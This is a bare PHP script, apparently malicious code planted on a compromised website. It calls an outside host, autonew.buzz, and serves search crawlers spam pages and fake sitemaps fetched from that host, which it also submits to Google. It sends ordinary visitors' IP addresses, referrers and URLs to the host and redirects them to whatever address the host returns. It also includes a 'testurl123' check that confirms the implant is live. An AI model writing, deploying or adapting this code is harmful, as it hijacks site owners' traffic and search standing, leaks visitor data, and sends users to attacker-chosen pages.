<?php
$siteYuming = "autonew.buzz/";
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$urlrefer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$geturl = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$geturl = str_replace("/index.php?", "", $geturl);
$geturl = str_replace("/?", "", $geturl);
$hostName = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$Remote_Address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
$pingurl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $hostName . "/sitemap.xml";
if (is_https()) {
    $ht = "https";
} else {
    $ht = "http";
}
$pingurl = "https://www.google.com/ping?sitemap=" . $pingurl;
if (stripos($_SERVER['REQUEST_URI'], 'pingsitemap') !== false) {
    $url = "http://" . $siteYuming . "/pingsitemap";
    $post_data = array(
        'hostName' => $hostName
    );
    $sitemapcount = send_post($url, $post_data);
    for ($i = 1; $i <= $sitemapcount; $i++) {
        $pingurl = $ht . "://" . $hostName . "/sitemap" . $i . ".xml";
        $pingurl = "https://www.google.com/ping?sitemap=" . $pingurl;
        $contents = get($pingurl);
        if (strpos($contents, "Sitemap Notification Received")) {
            echo "Submitting Google Sitemap $pingurl : OK!<br>";
        } else {
            echo "Submitting Google Sitemap $pingurl : ERROR!<br>";
        }
    }
    exit;
}
if (stripos($_SERVER['REQUEST_URI'], 'testurl123') !== false) {
    echo "success:D1-2Ok" . $siteYuming;
    exit;
}
preg_match('/sitemap(\d+).xml/', $_SERVER['REQUEST_URI'], $matchsitemap);
if (stripos($_SERVER['REQUEST_URI'], 'sitemap.xml') !== false || count($matchsitemap) > 0) {
    header('Content-type:application/xml');
    $hostName = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $hostName;
    $url = "http://" . $siteYuming . "sitemap";
    $post_data = array(
        'hostName' => $hostName,
        'getcontext' => $geturl,
    );
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow;
    exit;
}
$version = preg_match('/([a-z]){4}(\d+)/', $geturl, $match);
if ($match || stripos($user_agent, "bot")) {
    $hostName = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $hostName;
    $url = "http://" . $siteYuming . "getContext";
    if (stripos($user_agent, "bot")) {

        $post_data = array(
            'getcontext' => $geturl,
            'hostName' => $hostName,
        );
        $htmlToshow = send_post($url, $post_data);
        echo $htmlToshow;
        exit;
    } else {
        $lastUrl = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        $shellurl = $hostName . $lastUrl;
        $post_data = array(
            'urlrefer' => $urlrefer,
            'shellinhtml' => $shellurl,
            'gotohtml' => $geturl,
            'ip' => $Remote_Address,
            'hostName' => $hostName,
        );
        $htmlToshow = send_post($url, $post_data);
        if (stripos($htmlToshow, "okGohtml") == true) {
            $htmlToshow = str_ireplace("okGohtml", "", $htmlToshow);
              echo('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></head><body><noscript><meta http-equiv="refresh" content="0; url='.$htmlToshow.'" /></noscript><script>document.location.href = "'.$htmlToshow.'"</script></body></html>');
            exit;
        }
    }
}
function send_post($url, $post_data)
{
    $postdata = http_build_query($post_data);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-type:application/x-www-form-urlencoded',
            'content' => $postdata,
            'timeout' => 15 * 60
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

function get($url)
{
    $contents = @file_get_contents($url);
    if (!$contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    return $contents;
}

function is_https()
{
    if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}
?>